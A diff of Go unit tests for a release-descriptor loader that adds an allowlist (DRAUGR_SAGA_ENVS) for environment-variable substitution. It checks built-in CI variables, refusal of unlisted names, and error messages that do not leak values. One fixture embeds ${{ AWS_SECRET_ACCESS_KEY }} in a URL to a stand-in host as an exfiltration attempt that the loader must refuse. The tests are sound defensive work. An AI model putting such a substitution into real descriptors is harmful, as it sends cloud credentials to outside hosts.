@@ -99,6 +99,7 @@ func TestControllerEnabled(t *testing.T) {
 func TestEnvSubstitution(t *testing.T) {
 	t.Setenv("RELEASE_VERSION", "9.9")
 	t.Setenv("IMG_TAG", "abc")
+	t.Setenv(SagaEnvsVar, "OTHER, IMG_TAG")
 	src := `
 project: x
 release:
@@ -136,13 +137,101 @@ components:
 }
 
 func TestEnvSubstitutionMissing(t *testing.T) {
+	t.Setenv(SagaEnvsVar, "NOT_SET_VAR_XYZ")
 	src := `
 release:
   version: "${{ NOT_SET_VAR_XYZ }}"
 `
 	_, err := Load([]byte(src))
-	if err == nil || !strings.Contains(err.Error(), "NOT_SET_VAR_XYZ") {
+	if err == nil || err.Error() != "undefined environment variable(s) referenced in saga: NOT_SET_VAR_XYZ" {
 		t.Fatalf("expected missing-var error, got %v", err)
+	}
+}
+
+// The built-in names are CI metadata and the documentation's own examples, none of them a
+// credential, so a descriptor substitutes them with nothing listed.
+func TestEnvSubstitutionOfABuiltInNeedsNoListing(t *testing.T) {
+	t.Setenv(SagaEnvsVar, "")
+	for _, name := range builtinSagaEnvs {
+		t.Setenv(name, "v-"+name)
+	}
+	m, err := Load([]byte(`
+project: x
+release:
+  version: "${{ GITHUB_SHA }}-${{ CI_COMMIT_SHA }}-${{ BUILD_SOURCEVERSION }}-${{ RELEASE_VERSION }}"
+components:
+  - name: c
+    images:
+      - image: repo/x:${{ IMAGE_TAG }}
+`))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if want := "v-GITHUB_SHA-v-CI_COMMIT_SHA-v-BUILD_SOURCEVERSION-v-RELEASE_VERSION"; m.Release.Version != want {
+		t.Errorf("version = %q, want %q", m.Release.Version, want)
+	}
+	if m.Components[0].Images[0].Image != "repo/x:v-IMAGE_TAG" {
+		t.Errorf("image = %q", m.Components[0].Images[0].Image)
+	}
+}
+
+// A descriptor changes by pull request, and every value it holds can reach the network. A name the
+// pipeline did not list is refused, and refused the same way whether or not the job holds it, so
+// loading a descriptor cannot be used to learn which variables exist either.
+func TestEnvSubstitutionRefusesAnUnlistedName(t *testing.T) {
+	t.Setenv(SagaEnvsVar, "STAGING_HOST")
+	want := "environment variable(s) referenced in saga and not listed in $DRAUGR_SAGA_ENVS: AWS_SECRET_ACCESS_KEY. " +
+		"Set DRAUGR_SAGA_ENVS=AWS_SECRET_ACCESS_KEY in the pipeline's environment (comma-separated), listing only variables that hold no secret"
+	attack := `
+project: x
+release:
+  version: "1.0"
+components:
+  - name: c
+    hosts:
+      - name: api
+        url: https://x.example/?k=${{ AWS_SECRET_ACCESS_KEY }}
+`
+	t.Run("set", func(t *testing.T) {
+		t.Setenv("AWS_SECRET_ACCESS_KEY", "aws-secret")
+		_, err := Load([]byte(attack))
+		if err == nil || err.Error() != want {
+			t.Errorf("err = %v\nwant  %s", err, want)
+		}
+		if err != nil && strings.Contains(err.Error(), "aws-secret") {
+			t.Errorf("the refusal printed the value: %v", err)
+		}
+	})
+	t.Run("unset", func(t *testing.T) {
+		t.Setenv("AWS_SECRET_ACCESS_KEY", "") // restores whatever the environment held afterwards
+		_ = os.Unsetenv("AWS_SECRET_ACCESS_KEY")
+		_, err := Load([]byte(attack))
+		if err == nil || err.Error() != want {
+			t.Errorf("err = %v\nwant  %s", err, want)
+		}
+	})
+	t.Run("refused before missing", func(t *testing.T) {
+		// An unlisted name is reported as unlisted even beside a listed one that is unset.
+		_, err := Load([]byte("release:\n  version: \"${{ STAGING_HOST }}${{ AWS_SECRET_ACCESS_KEY }}\"\n"))
+		if err == nil || err.Error() != want {
+			t.Errorf("err = %v", err)
+		}
+	})
+}
+
+// builtinSagaEnvs is documented in the Saga reference, where a reader looks before listing a name.
+func TestTheBuiltInVariablesAreDocumented(t *testing.T) {
+	doc, err := os.ReadFile(filepath.Join("..", "..", "docs", "reference", "saga-schema.md"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, name := range builtinSagaEnvs {
+		if !strings.Contains(string(doc), "`"+name+"`") {
+			t.Errorf("docs/reference/saga-schema.md does not list %s, which a descriptor may substitute unlisted", name)
+		}
+	}
+	if !strings.Contains(string(doc), SagaEnvsVar) {
+		t.Errorf("docs/reference/saga-schema.md does not name %s", SagaEnvsVar)
 	}
 }
 
